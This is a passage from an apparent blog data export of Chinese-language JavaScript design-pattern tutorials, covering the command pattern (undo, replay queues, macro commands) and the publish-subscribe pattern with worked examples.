'增 加 子 菜 单' ); &#125;, del: function()&#123; console.log( '删 除 子 菜 单' ); &#125; &#125;; bindClick( button1, MenuBar.refresh ); bindClick( button2, SubMenu.add );bindClick( button3, SubMenu.del ); 这种说法是正确的，上面的示例代码是模拟传统面向对象语言的命令模式实现。命令模式将过程式的请求调用封装在command对象的execute方法里，通过封装方法调用，我们可以把运算块包装成形。command对象可以被四处传递，所以在调用命令的时候，客户（Client）不需要关心事情是如何进行的。 命令模式的由来，其实是回调（callback）函数的一个面向对象的替代品。 JavaScript作为将函数作为一等对象的语言，跟策略模式一样，命令模式也早已融入到了JavaScript语言之中。运算块不一定要封装在command.execute方法中，也可以封装在普通函数中。函数作为一等对象，本身就可以被四处传递。即使我们依然需要请求“接收者”，那也未必使用面向对象的方式，闭包可以完成同样的功能。 在面向对象设计中，命令模式的接收者被当成command对象的属性保存起来，同时约定执行命令的操作调用command.execute方法。在使用闭包的命令模式实现中，接收者被封闭在闭包产生的环境中，执行命令的操作可以更加简单，仅仅执行回调函数即可。无论接收者被保存为对象的属性，还是被封闭在闭包产生的环境中，在将来执行命令的时候，接收者都能被顺利访问。用闭包实现的命令模式如下代码所示：1234567var setCommand = function( button, func )&#123; button.onclick = function()&#123; func(); &#125; &#125;; var MenuBar = &#123; refresh: function()&#123; console.log( '刷 新 菜 单 界 面' ); &#125; &#125;; var RefreshMenuBarCommand = function( receiver )&#123; return function()&#123; receiver.refresh(); &#125; &#125;; var refreshMenuBarCommand = RefreshMenuBarCommand( MenuBar ); setCommand( button1, refreshMenuBarCommand ); 当然，如果想更明确地表达当前正在使用命令模式，或者除了执行命令之外，将来有可能还要提供撤销命令等操作。那我们最好还是把执行函数改为调用execute方法：12345var RefreshMenuBarCommand = function( receiver )&#123; return &#123; execute: function()&#123; receiver.refresh(); &#125; &#125; &#125;; var setCommand = function( button, command )&#123; button.onclick = function()&#123; command.execute(); &#125; &#125;; var refreshMenuBarCommand = RefreshMenuBarCommand( MenuBar ); setCommand( button1, refreshMenuBarCommand ); 撤销命令命令模式的作用不仅是封装运算块，而且可以很方便地给命令对象增加撤销操作。就像订餐时客人可以通过电话来取消订单一样。下面来看撤销命令的例子。本节的目标是利用Animate类来编写一个动画，这个动画的表现是让页面上的小球移动到水平方向的某个位置。现在页面中有一个input文本框和一个button按钮，文本框中可以输入一些数字，表示小球移动后的水平位置，小球在用户点击按钮后立刻开始移动，代码如下：12345678var ball = document.getElementById( 'ball' ); var pos = document.getElementById( 'pos' ); var moveBtn = document.getElementById( 'moveBtn' ); moveBtn.onclick = function()&#123; var animate = new Animate( ball ); animate.start( 'left', pos.value, 1000, 'strongEaseOut' ); &#125;; 如果文本框输入200，然后点击moveBtn按钮，可以看到小球顺利地移动到水平方向200px的位置。现在我们需要一个方法让小球还原到开始移动之前的位置。当然也可以在文本框中再次输入-200，并且点击moveBtn按钮，这也是一个办法，不过显得很笨拙。页面上最好有一个撤销按钮，点击撤销按钮之后，小球便能回到上一次的位置。在给页面中增加撤销按钮之前，先把目前的代码改为用命令模式实现：12345678910111213var ball = document.getElementById( 'ball' );var pos = document.getElementById( 'pos' ); var moveBtn = document.getElementById( 'moveBtn' ); var MoveCommand = function( receiver, pos )&#123; this.receiver = receiver; this.pos = pos; &#125;; MoveCommand.prototype.execute = function()&#123; this.receiver.start( 'left', this.pos, 1000, 'strongEaseOut' ); &#125;; var moveCommand; moveBtn.onclick = function()&#123; var animate = new Animate( ball ); moveCommand = new MoveCommand( animate, pos.value ); moveCommand.execute(); &#125;; 接下来增加撤销按钮,撤销操作的实现一般是给命令对象增加一个名为unexecude或者undo的方法，在该方法里执行execute的反向操作。在command.execute方法让小球开始真正运动之前，我们需要先记录小球的当前位置，在unexecude或者undo操作中，再让小球回到刚刚记录下的位置，代码如下：1234567891011121314151617181920212223var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');var cancelBtn = document.getElementById('cancelBtn');var MoveCommand = function(receiver, pos) &#123; this.receiver = receiver; this.pos = pos; this.oldPos = null;&#125;;MoveCommand.prototype.execute = function() &#123; this.receiver.start('left', this.pos, 1000, 'strongEaseOut'); this.oldPos = this.receiver.dom.getBoundingClientRect()[this.receiver.propertyName]; // 记 录 小 球 开 始 移 动 前 的 位 置 &#125;; MoveCommand.prototype.undo = function()&#123; this.receiver.start( 'left', this.oldPos, 1000, 'strongEaseOut' ); // 回 到 小 球 移 动 前 记 录 的 位 置 &#125;; var moveCommand; moveBtn.onclick = function()&#123; var animate = new Animate( ball ); moveCommand = new MoveCommand( animate, pos.value ); moveCommand.execute(); &#125;; cancelBtn.onclick = function()&#123; moveCommand.undo(); // 撤 销 命 令 &#125;; 现在通过命令模式轻松地实现了撤销功能。如果用普通的方法调用来实现，也许需要每次都手工记录小球的运动轨迹，才能让它还原到之前的位置。而命令模式中小球的原始位置在小球开始移动前已经作为command对象的属性被保存起来，所以只需要再提供一个undo方法，并且在undo方法中让小球回到刚刚记录的原始位置就可以了。撤销是命令模式里一个非常有用的功能，试想一下开发一个围棋程序的时候，我们把每一步棋子的变化都封装成命令，则可以轻而易举地实现悔棋功能。同样，撤销命令还可以用于实现文本编辑器的Ctrl+Z功能。 撤消和重做上一节我们讨论了如何撤销一个命令。很多时候，我们需要撤销一系列的命令。比如在一个围棋程序中，现在已经下了10步棋，我们需要一次性悔棋到第5步。在这之前，我们可以把所有执行过的下棋命令都储存在一个历史列表中，然后倒序循环来依次执行这些命令的undo操作，直到循环执行到第5个命令为止。 然而，在某些情况下无法顺利地利用undo操作让对象回到execute之前的状态。比如在一个Canvas画图的程序中，画布上有一些点，我们在这些点之间画了N条曲线把这些点相互连接起来，当然这是用命令模式来实现的。但是我们却很难为这里的命令对象定义一个擦除某条曲线的undo操作，因为在Canvas画图中，擦除一条线相对不容易实现。 这时候最好的办法是先清除画布，然后把刚才执行过的命令全部重新执行一遍，这一点同样可以利用一个历史列表堆栈办到。记录命令日志，然后重复执行它们，这是逆转不可逆命令的一个好办法。 在HTML5版《街头霸王》游戏中，命令模式可以用来实现播放录像功能。原理跟Canvas画图的例子一样，我们把用户在键盘的输入都封装成命令，执行过的命令将被存放到堆栈中。播放录像的时候只需要从头开始依次执行这些命令便可，代码如下：1234567891011121314151617181920212223242526272829303132var Ryu = &#123; attack: function()&#123; console.log( '攻 击' ); &#125;, defense: function()&#123; console.log( '防 御' ); &#125;, jump: function()&#123; console.log( '跳 跃' ); &#125;, crouch: function()&#123; console.log( '蹲 下' ); &#125;&#125;; var makeCommand = function( receiver, state )&#123; // 创 建 命 令 return function()&#123; receiver[ state ](); &#125; &#125;; var commands = &#123; \"119\": \"jump\", // W \"115\": \"crouch\", // S \"97\": \"defense\", // A \"100\": \"attack\" // D &#125;;var commandStack = []; // 保 存 命 令 的 堆 栈 document.onkeypress = function( ev )&#123; var keyCode = ev.keyCode, command = makeCommand( Ryu, commands[ keyCode ] ); if ( command )&#123; command(); // 执 行 命 令 commandStack.push( command ); // 将 刚 刚 执 行 过 的 命 令 保 存 进 堆 栈 &#125; &#125;; document.getElementById( 'replay' ).onclick = function()&#123; // 点 击 播 放 录 像 var command; while( command = commandStack.shift() )&#123; // 从 堆 栈 里 依 次 取 出 命 令 并 执 行 command(); &#125; &#125;; 命令队列在订餐的故事中，如果订单的数量过多而厨师的人手不够，则可以让这些订单进行排队处理。第一个订单完成之后，再开始执行跟第二个订单有关的操作。 队列在动画中的运用场景也非常多，比如之前的小球运动程序有可能遇到另外一个问题：有些用户反馈，这个程序只适合于APM小于20的人群，大部分用户都有快速连续点击按钮的习惯，当用户第二次点击button的时候，此时小球的前一个动画可能尚未结束，于是前一个动画会骤然停止，小球转而开始第二个动画的运动过程。但这并不是用户的期望，用户希望这两个动画会排队进行。 把请求封装成命令对象的优点在这里再次体现了出来，对象的生命周期几乎是永久的，除非我们主动去回收它。也就是说，命令对象的生命周期跟初始请求发生的时间无关，command对象的execute方法可以在程序运行的任何时刻执行，即使点击按钮的请求早已发生，但我们的命令对象仍然是有生命的。 所以我们可以把div的这些运动过程都封装成命令对象，再把它们压进一个队列堆栈，当动画执行完，也就是当前command对象的职责完成之后，会主动通知队列，此时取出正在队列中等待的第一个命令对象，并且执行它。 我们比较关注的问题是，一个动画结束后该如何通知队列。通常可以使用回调函数来通知队列，除了回调函数之外，还可以选择发布-订阅模式。即在一个动画结束后发布一个消息，订阅者接收到这个消息之后，便开始执行队列里的下一个动画。 宏命令宏命令是一组命令的集合，通过执行宏命令的方式，可以一次执行一批命令。想象一下，家里有一个万能遥控器，每天回家的时候，只要按一个特别的按钮，它就会帮我们关上房间门，顺便打开电脑并登录QQ。 下面我们看看如何逐步创建一个宏命令。首先，我们依然要创建好各种Command：123var closeDoorCommand = &#123; execute: function()&#123; console.log( '关 门' ); &#125; &#125;; var openPcCommand = &#123; execute: function()&#123; console.log( '开 电 脑' ); &#125; &#125;; var openQQCommand = &#123; execute: function()&#123; console.log( '登 录 QQ' ); &#125; &#125;; 接下来定义宏命令MacroCommand，它的结构也很简单。macroCommand.add方法表示把子命令添加进宏命令对象，当调用宏命令对象的execute方法时，会迭代这一组子命令对象，并且依次执行它们的execute方法：1234567891011121314151617var MacroCommand = function()&#123; return &#123; commandsList: [], add: function( command )&#123; this.commandsList.push( command ); &#125;, execute: function()&#123; for ( var i = 0, command; command = this.commandsList[ i++ ]; )&#123; command.execute(); &#125; &#125; &#125; &#125;; var macroCommand = MacroCommand();macroCommand.add( closeDoorCommand ); macroCommand.add( openPcCommand ); macroCommand.add( openQQCommand ); macroCommand.execute(); 当然我们还可以为宏命令添加撤销功能，跟macroCommand.execute类似，当调用macroCommand.undo方法时，宏命令里包含的所有子命令对象要依次执行各自的undo操作。宏命令是命令模式与组合模式的联用产物，关于组合模式，将在后面详细介绍。 智能命令与傻瓜命令再看一下我们创建的关门命令：1var closeDoorCommand = &#123; execute: function()&#123; console.log( '关 门' ); &#125; &#125;; 很奇怪，closeDoorCommand中没有包含任何receiver的信息，它本身就包揽了执行请求的行为，这跟我们之前看到的命令对象都包含了一个receiver是矛盾的。 一般来说，命令模式都会在command对象中保存一个接收者来负责真正执行客户的请求，这种情况下命令对象是“傻瓜式”的，它只负责把客户的请求转交给接收者来执行，这种模式的好处是请求发起者和请求接收者之间尽可能地得到了解耦。 但是我们也可以定义一些更“聪明”的命令对象，“聪明”的命令对象可以直接实现请求，这样一来就不再需要接收者的存在，这种“聪明”的命令对象也叫作智能命令。没有接收者的智能命令，退化到和策略模式非常相近，从代码结构上已经无法分辨它们，能分辨的只有它们意图的不同。策略模式指向的问题域更小，所有策略对象的目标总是一致的，它们只是达到这个目标的不同手段，它们的内部实现是针对“算法”而言的。而智能命令模式指向的问题域更广，command对象解决的目标更具发散性。命令模式还可以完成撤销、排队等功能。 小结JavaScript可以用高阶函数非常方便地实现命令模式。命令模式在JavaScript语言中是一种隐形的模式。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-7-发布-订阅模式（观察者模式）","slug":"js-pattern7","date":"2017-11-17T14:38:20.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/17/js-pattern7/","link":"","permalink":"https://github.com/xmoyKING/2017/11/17/js-pattern7/","excerpt":"","text":"发布-订阅模式（观察者模式）定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。在JavaScript开发中，我们一般用事件模型来替代传统的发布—订阅模式。 不论是在程序世界里还是现实生活中，发布—订阅模式的应用都非常之广泛。先看一个现实中的例子。 小明最近看上了一套房子，到了售楼处之后才被告知，该楼盘的房子早已售罄。好在售楼MM告诉小明，不久后还有一些尾盘推出，开发商正在办理相关手续，手续办好后便可以购买。但到底是什么时候，目前还没有人能够知道。 于是小明记下了售楼处的电话，以后每天都会打电话过去询问是不是已经到了购买时间。除了小明，还有小红、小强、小龙也会每天向售楼处咨询这个问题。一个星期过后，售楼MM决定辞职，因为厌倦了每天回答1000个相同内容的电话。 当然现实中没有这么笨的销售公司，实际上故事是这样的：小明离开之前，把电话号码留在了售楼处。售楼MM答应他，新楼盘一推出就马上发信息通知小明。小红、小强和小龙也是一样，他们的电话号码都被记在售楼处的花名册上，新楼盘推出的时候，售楼MM会翻开花名册，遍历上面的电话号码，依次发送一条短信来通知他们。 发布－订阅模式的作用在刚刚的例子中，发送短信通知就是一个典型的发布—订阅模式，小明、小红等购买者都是订阅者，他们订阅了房子开售的消息。售楼处作为发布者，会在合适的时候遍历花名册上的电话号码，依次给购房者发布消息。可以发现，在这个例子中使用发布—订阅模式有着显而易见的优点。 购房者不用再天天给售楼处打电话咨询开售时间，在合适的时间点，售楼处作为发布者会通知这些消息订阅者。 购房者和售楼处之间不再强耦合在一起，当有新的购房者出现时，他只需把手机号码留在售楼处，售楼处不关心购房者的任何情况，不管购房者是男是女还是一只猴子。而售楼处的任何变动也不会影响购买者，比如售楼MM离职，售楼处从一楼搬到二楼，这些改变都跟购房者无关，只要售楼处记得发短信这件事情。 第一点说明发布—订阅模式可以广泛应用于异步编程中，这是一种替代传递回调函数的方案。比如，我们可以订阅ajax请求的error、succ等事件。或者如果想在动画的每一帧完成之后做一些事情，那我们可以订阅一个事件，然后在动画的每一帧完成之后发布这个事件。在异步编程中使用发布—订阅模式，我们就无需过多关注对象在异步运行期间的内部状态，而只需要订阅感兴趣的事件发生点。 第二点说明发布—订阅模式可以取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。发布—订阅模式让两个对象松耦合地联系在一起，虽然不太清楚彼此的细节，但这不影响它们之间相互通信。当有新的订阅者出现时，发布者的代码不需要任何修改；同样发布者需要改变时，也不会影响到之前的订阅者。只要之前约定的事件名没有变化，就可以自由地改变它们。 DOM事件实际上，只要我们曾经在DOM节点上面绑定过事件函数，那我们就曾经使用过发布—订阅模式，来看看下面这两句简单的代码发生了什么事情：12345document.body.addEventListener( 'click', function()&#123; alert( 2); &#125;, false ); document.body.click(); // 模 拟 用 户 点 击 在这里需要监控用户点击document.body的动作，但是我们没办法预知用户将在什么时候点击。所以我们订阅document.body上的click事件，当body节点被点击时，body节点便会向订阅者发布这个消息。这很像购房的例子，购房者不知道房子什么时候开售，于是他在订阅消息后等待售楼处发布消息。 当然我们还可以随意增加或者删除订阅者，增加任何订阅者都不会影响发布者代码的编写：1234document.body.addEventListener( 'click', function()&#123; alert( 2); &#125;, false );document.body.addEventListener( 'click', function()&#123; alert( 3); &#125;, false );document.body.addEventListener( 'click', function()&#123; alert( 4); &#125;, false ); document.body.click();//模拟用户点击 注意，手动触发事件更好的做法是IE下用fireEvent，标准浏览器下用dispatchEvent实现。 自定义事件除了DOM事件，我们还会经常实现一些自定义的事件，这种依靠自定义事件完成的发布—订阅模式可以用于任何JavaScript代码中。现在看看如何一步步实现发布—订阅模式。 首先要指定好谁充当发布者（比如售楼处）； 然后给发布者添加一个缓存列表（售楼处的花名册），用于存放回调函数以便通知订阅者； 最后发布消息的时候，发布者会遍历这个缓存列表，依次触发里面存放的订阅者回调函数（遍历花名册，挨个发短信）。 另外，我们还可以往回调函数里填入一些参数，订阅者可以接收这些参数。这是很有必要的，比如售楼处可以在发给订阅者的短信里加上房子的单价、面积、容积率等信息，订阅者接收到这些信息之后可以进行各自的处理：123456789101112var salesOffices = &#123;&#125;; // 定 义 售 楼 处 salesOffices.clientList = []; // 缓 存 列 表， 存 放 订 阅 者 的 回 调 函 数 salesOffices.listen = function( fn )&#123; // 增 加 订 阅 者 this.clientList.push( fn ); // 订 阅 的 消 息 添 加 进 缓 存 列 表 &#125;; salesOffices.trigger = function()&#123; // 发 布 消 息 for( var i = 0, fn; fn = this.clientList[ i++ ]; )&#123; fn.apply( this, arguments ); // (2) // arguments 是 发 布 消 息 时 带 上 的 参 数 &#125; &#125;; 进行一些简单的测试：1234567891011salesOffices.listen( function( price, squareMeter )&#123; // 小 明 订 阅 消 息 console.log( '价 格 = ' + price ); console.log( 'squareMeter = ' + squareMeter ); &#125;); salesOffices.listen( function( price, squareMeter )&#123; // 小 红 订 阅 消 息 console.log( '价 格 = ' + price ); console.log( 'squareMeter = ' + squareMeter ); &#125;); salesOffices.trigger( 2000000, 88 ); // 2次输 出： 200 万， 88 平 方 米 salesOffices.trigger( 3000000, 110 ); // 2次输 出： 300 万， 110 平 方 米 这里还存在一些问题。我们看到订阅者接收到了发布者发布的每个消息（每个消息都输出了2次），虽然小明只想买88平方米的房子，但是发布者把110平方米的信息也推送给了小明，这对小明来说是不必要的困扰。所以我们有必要增加一个标示key，让订阅者只订阅自己感兴趣的消息。改写后的代码如下：1234567891011121314151617181920212223242526272829303132var salesOffices = &#123;&#125;; // 定 义 售 楼 处 salesOffices.clientList = &#123;&#125;; // 缓 存 列 表， 存 放 订 阅 者 的 回 调 函 数 salesOffices.listen = function( key, fn )&#123; if ( !this.clientList[ key ] )&#123; // 如 果 还 没 有 订 阅 过 此 类 消 息， 给 该 类 消 息 创 建 一 个 缓 存 列 表 this.clientList[ key ] = []; &#125; this.clientList[ key ].push( fn ); // 订 阅 的 消 息 添 加 进 消 息 缓 存 列 表 &#125;;salesOffices.trigger = function()&#123; // 发 布 消 息 var key = Array.prototype.shift.call( arguments ), // 取 出 消 息 类 型 fns = this.clientList[ key ]; // 取 出 该 消 息 对 应 的 回 调 函 数 集 合 if ( !fns || fns.length === 0 )&#123; // 如 果 没 有 订 阅 该 消 息， 则 返 回 return false; &#125; for( var i = 0, fn; fn = fns[ i++ ]; )&#123; fn.apply( this, arguments ); // arguments 是 发 布 消 息 时 附 送 的 参 数 &#125; &#125;; salesOffices.listen( 'squareMeter88', function( price )&#123; // 小 明 订 阅 88 平 方 米 房 子 的 消 息 console.log( '价 格 = ' + price ); // 输 出： 2000000 &#125;); salesOffices.listen( 'squareMeter110', function( price )&#123; // 小 红 订 阅 110 平 方 米 房 子 的 消 息 console.log( '价 格 = ' + price ); // 输 出： 3000000 &#125;); salesOffices.trigger( 'squareMeter88', 2000000 ); // 发 布 88 平 方 米 房 子 的 价 格salesOffices.trigger( 'squareMeter110', 3000000 ); // 发 布 110 平 方 米 房 子 的 价 格 很明显，现在订阅者可以只订阅自己感兴趣的事件了。 发布－订阅模式的通用实现现在我们已经看到了如何让售楼处拥有接受订阅和发布事件的功能。假设现在小明又去另一个售楼处买房子，那么这段代码是否必须在另一个售楼处对象上重写一次呢，有没有办法可以让所有对象都拥有发布—订阅功能呢？ JavaScript作为一门解释执行的语言，给对象动态添加职责是理所当然的事情。所以我们把发布—订阅的功能提取出来，放在一个单独的对象内：12345678910111213141516171819var event = &#123; clientList: [], listen: function( key, fn )&#123; if ( !this.clientList[ key ] )&#123; this.clientList[ key ] = []; &#125; this.clientList[ key ].push( fn ); // 订 阅 的 消 息 添 加 进 缓 存 列 表 &#125;, trigger: function()&#123; var key = Array.prototype.shift.call( arguments ), // (1); fns = this.clientList[ key ]; if ( !fns || fns.length === 0 )&#123; // 如 果 没 有 绑 定 对 应 的 消 息 return false; &#125; for( var i = 0, fn; fn = fns[ i++ ]; )&#123; fn.apply( this, arguments ); // (2) // arguments 是 trigger 时 带 上 的 参 数 &#125; &#125;&#125;; 再定义一个installEvent函数，这个函数可以给所有的对象都动态安装发布—订阅功能：12345var installEvent = function( obj )&#123; for ( var i in event )&#123; obj[ i ] = event[ i ]; &#125; &#125;; 来测试一番，我们给售楼处对象salesOffices动态增加发布—订阅功能：123456789101112var salesOffices = &#123;&#125;; installEvent( salesOffices ); salesOffices.listen( 'squareMeter88', function( price )&#123; // 小 明 订 阅 消 息 console.log( '价 格 = ' + price ); &#125;); salesOffices.listen( 'squareMeter100', function( price )&#123; // 小 红 订 阅 消 息 console.log( '价 格 = ' + price ); &#125;); salesOffices.trigger( 'squareMeter88', 2000000 ); // 输 出： 2000000 salesOffices.trigger( 'squareMeter100', 3000000 ); // 输 出： 3000000 取消订阅的事件有时候，我们也许需要取消订阅事件的功能。比如小明突然不想买房子了，为了避免继续接收到售楼处推送过来的短信，小明需要取消之前订阅的事件。现在我们给event对象增加remove方法：1234567891011121314151617181920212223242526272829303132333435event.remove = function( key, fn )&#123; var fns = this.clientList[ key ]; if ( !fns )&#123; // 如 果 key 对 应 的 消 息 没 有 被 人 订 阅， 则 直 接 返 回 return false; &#125; if ( !fn )&#123; // 如 果 没 有 传 入 具 体 的 回 调 函 数， 表 示 需 要 取 消 key 对 应 消 息 的 所 有 订 阅 fns &amp;&amp; ( fns.length = 0 ); &#125;else&#123; for ( var l = fns.length - 1; l &gt;= 0; l-- )&#123; // 反 向 遍 历 订 阅 的 回 调 函 数 列 表 var _fn = fns[ l ]; if ( _fn === fn )&#123; fns.splice( l, 1 ); // 删 除 订 阅 者 的 回 调 函 数 &#125; &#125; &#125; &#125;; var salesOffices = &#123;&#125;; var installEvent = function( obj )&#123; for ( var i in event )&#123; obj[ i ] = event[ i ]; &#125; &#125; installEvent( salesOffices ); salesOffices.listen( 'squareMeter88', fn1 = function( price )&#123; // 小 明 订 阅 消 息 console.log( '价 格 = ' + price ); &#125;); salesOffices.listen( 'squareMeter88', fn2 = function( price )&#123; // 小 红 订 阅 消 息 console.log( '价 格 = ' + price ); &#125;); salesOffices.remove( 'squareMeter88', fn1 ); // 删 除 小 明 的 订 阅 salesOffices.trigger( 'squareMeter88', 2000000 ); // 输 出： 2000000 例子——网站登录假如我们正在开发一个商城网站，网站里有header头部、nav导航、消息列表、购物车等模块。这几个模块的渲染有一个共同的前提条件，就是必须先用ajax异步请求获取用户的登录信息。这是很正常的，比如用户的名字和头像要显示在header模块里，而这两个字段都来自用户登录后返回的信息。至于ajax请求什么时候能成功返回用户信息，这点我们没有办法确定。现在的情节看起来像极了售楼处的例子，小明不知道什么时候开发商的售楼手续能够成功办下来。 但现在还不足以说服我们在此使用发布—订阅模式，因为异步的问题通常也可以用回调函数来解决。更重要的一点是，我们不知道除了header头部、nav导航、消息列表、购物车之外，将来还有哪些模块需要使用这些用户信息。如果它们和用户信息模块产生了强耦合，比如下面这样的形式：123456login.succ( function( data)&#123; header.setAvatar( data.avatar); // 设 置 header 模 块 的 头 像 nav.setAvatar( data.avatar ); // 设 置 导 航 模 块 的 头 像 message.refresh(); // 刷 新 消 息 列 表 cart.refresh(); // 刷 新 购 物 车 列 表 &#125;); 现在登录模块是我们负责编写的，但我们还必须了解header模块里设置头像的方法叫setAvatar、购物车模块里刷新的方法叫refresh，这种耦合性会使程序变得僵硬，header模块不能随意再改变setAvatar的方法名，它自身的名字也不能被改为header1、header2。这是针对具体实现编程的典型例子，针对具体实现编程是不被赞同的。 等到有一天，项目中又新增了一个收货地址管理的模块，这个模块本来是另一个同事所写的，而此时你正在马来西亚度假，但是他却不得不给你打电话：“Hi，登录之后麻烦刷新一下收货地址列表。”于是你又翻开你3个月前写的登录模块，在最后部分加上这行代码：12345678login.succ( function( data)&#123; header.setAvatar( data.avatar); // 设 置 header 模 块 的 头 像 nav.setAvatar( data.avatar ); // 设 置 导 航 模 块 的 头 像 message.refresh(); // 刷 新 消 息 列 表 cart.refresh(); // 刷 新 购 物 车 列 表 address.refresh(); // 增 加 这 行 代 码&#125;); 我们就会越来越疲于应付这些突如其来的业务要求，要么跳槽了事，要么必须来重构这些代码。 用发布—订阅模式重写之后，对用户信息感兴趣的业务模块将自行订阅登录成功的消息事件。当登录成功时，登录模块只需要发布登录成功的消息，而业务方接受到消息之后，就会开始进行各自的业务处理，登录模块并不关心业务方究竟要做什么，也不想去了解它们的内部细节。改善后的代码如下：123$.ajax('http://xxx.com?login', function( data)&#123; // 登 录 成 功 login.trigger( 'loginSucc', data); // 发 布 登 录 成 功 的 消 息 &#125;); 各模块监听登录成功的消息：1234567891011var header = (function()&#123; // header 模 块 login.listen( 'loginSucc', function( data)&#123; header.setAvatar( data.avatar ); &#125;); return &#123; setAvatar: function( data )&#123; console.log( '设 置 header 模 块 的 头 像' ); &#125; &#125; &#125;)(); var nav = (function()&#123; // nav 模 块 login.listen( 'loginSucc', function( data )&#123; nav.setAvatar( data.avatar ); &#125;); return &#123; setAvatar: function( avatar )&#123; console.log( '设 置 nav 模 块 的 头 像' ); &#125; &#125; &#125;)(); 如上所述，我们随时可以把setAvatar的方法名改成setTouxiang。如果有一天在登录完成之后，又增加一个刷新收货地址列表的行为，那么只要在收货地址模块里加上监听消息的方法即可，而这可以让开发该模块的同事自己完成，你作为登录模块的开发者，永远不用再关心这些行为了。代码如下：12345var address = (function()&#123; // address 模 块 login.listen( 'loginSucc', function( obj )&#123; address.refresh( obj ); &#125;); return &#123; refresh: function( avatar )&#123; console.log( '刷 新 收 货 地 址 列 表' ); &#125; &#125; &#125;)(); 全局的发布－订阅对象回想下刚刚实现的发布—订阅模式，我们给售楼处对象和登录对象都添加了订阅和发布的功能，这里还存在两个小问题。 我们给每个发布者对象都添加了listen和trigger方法，以及一个缓存列表clientList，这其实是一种资源浪费。 小明跟售楼处对象还是存在一定的耦合性，小明至少要知道售楼处对象的名字是salesOffices，才能顺利的订阅到事件。见如下代码：1234salesOffices.listen( 'squareMeter100', function( price )&#123; // 小 明 订 阅 消 息 console.log( '价 格 = ' + price ); &#125;); 如果小明还关心300平方米的房子，而这套房子的卖家是salesOffices2，这意味着小明要开始订阅salesOffices2对象。 其实在现实中，买房子未必要亲自去售楼处，我们只要把订阅的请求交给中介公司，而各大房产公司也只需要通过中介公司来发布房子信息。这样一来，我们不用关心消息是来自哪个房产公司，我们在意的是能否顺利收到消息。当然，为了保证订阅者和发布者能顺利通信，订阅者和发布者都必须知道这个中介公司。 同样在程序中，发布—订阅模式可以用一个全局的Event对象来实现，订阅者不需要了解消息来自哪个发布者，发布者也不知道消息会推送给哪些订阅者，Event作为一个类似“中介者”的角色，把订阅者和发布者联系起来。见如下代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546var Event = (function()&#123; var clientList = &#123;&#125;, listen, trigger, remove; listen = function( key, fn )&#123; if ( !clientList[ key ] )&#123; clientList[ key ] = []; &#125; clientList[ key ].push( fn ); &#125;; trigger = function()&#123; var key = Array.prototype.shift.call( arguments ), fns = clientList[ key ]; if ( !fns || fns.length === 0 )&#123; return false; &#125; for( var i = 0, fn; fn = fns[ i++ ]; )&#123; fn.apply( this, arguments ); &#125; &#125;; remove = function( key, fn )&#123; var fns = clientList[ key ]; if ( !fns )&#123; return false; &#125; if ( !fn )&#123; fns &amp;&amp; ( fns.length = 0 ); &#125;else&#123; for ( var l = fns.length - 1; l &gt;= 0; l-- )&#123; var _fn = fns[ l ]; if ( _fn === fn )&#123; fns.splice( l, 1 ); &#125; &#125; &#125; &#125;; return &#123; listen: listen, trigger: trigger, remove: remove &#125; &#125;)();Event.listen( 'squareMeter88', function( price )&#123; // 小 红 订 阅 消 息 console.log( '价 格 = ' + price ); // 输 出：' 价 格 = 2000000' &#125;); Event.trigger( 'squareMeter88', 2000000 ); // 售 楼 处 发 布 消 息 模块间通信基于一个全局的Event对象实现的发布—订阅模式中，我们利用它可以在两个封装良好的模块中进行通信，这两个模块可以完全不知道对方的存在。就如同有了中介公司之后，我们不再需要知道房子开售的消息来自哪个售楼处。 比如现在有两个模块，a模块里面有一个按钮，每次点击按钮之后，b模块里的div中会显示按钮的总点击次数，我们用全局发布—订阅模式完成下面的代码，使得a模块和b模块可以在保持封装性的前提下进行通信。12345678910var a = (function()&#123; var count = 0; var button = document.getElementById( 'count' ); button.onclick = function()&#123; Event.trigger( 'add', count++ ); &#125; &#125;)(); var b = (function()&#123; var div = document.getElementById( 'show' ); Event.listen( 'add', function( count )&#123; div.innerHTML = count; &#125;); &#125;)(); 但在这里我们要留意另一个问题，模块之间如果用了太多的全局发布—订阅模式来通信，那么模块与模块之间的联系就被隐藏到了背后。我们最终会搞不清楚消息来自哪个模块，或者消息会流向哪些模块，这又会给我们的维护带来一些麻烦，也许某个模块的作用就是暴露一些接口给其他模块调用。 必须先订阅再发布吗我们所了解到的发布—订阅模式，都是订阅者必须先订阅一个消息，随后才能接收到发布者发布的消息。如果把顺序反过来，发布者先发布一条消息，而在此之前并没有对象来订阅它，这条消息无疑将消失在宇宙中。 在某些情况下，我们需要先将这条消息保存下来，等到有对象来订阅它的时候，再重新把消息发布给订阅者。就如同QQ中的离线消息一样，离线消息被保存在服务器中，接收人下次登录上线之后，可以重新收到这条消息。 这种需求在实际项目中是存在的，比如在之前的商城网站中，获取到用户信息之后才能渲染用户导航模块，而获取用户信息的操作是一个ajax异步请求。当ajax请求成功返回之后会发布一个事件，在此之前订阅了此事件的用户导航模块可以接收到这些用户信息。 但是这只是理想的状况，因为异步的原因，我们不能保证ajax请求返回的时间，有时候它返回得比较快，而此时用户导航模块的代码还没有加载好（还没有订阅相应事件），特别是在用了一些模块化惰性加载的技术后，这是很可能发生的事情。也许我们还需要一个方案，使得我们的发布—订阅对象拥有先发布后订阅的能力。 为了满足这个需求，我们要建立一个存放离线事件的堆栈，当事件发布的时候，如果此时还没有订阅者来订阅这个事件，我们暂时把发布事件的动作包裹在一个函数里，这些包装函数将被存入堆栈中，等到终于有对象来订阅此事件的时候，我们将遍历堆栈并且依次执行这些包装函数，也就是重新发布里面的事件。当然离线事件的生命周期只有一次，就像QQ的未读消息只会被重新阅读一次，所以刚才的操作我们只能进行一次。 全局事件的命名冲突全局的发布—订阅对象里只有一个clinetList来存放消息名和回调函数，大家都通过它来订阅和发布各种消息，久而久之，难免会出现事件名冲突的情况，所以我们还可以给Event对象提供创建命名空间的功能。 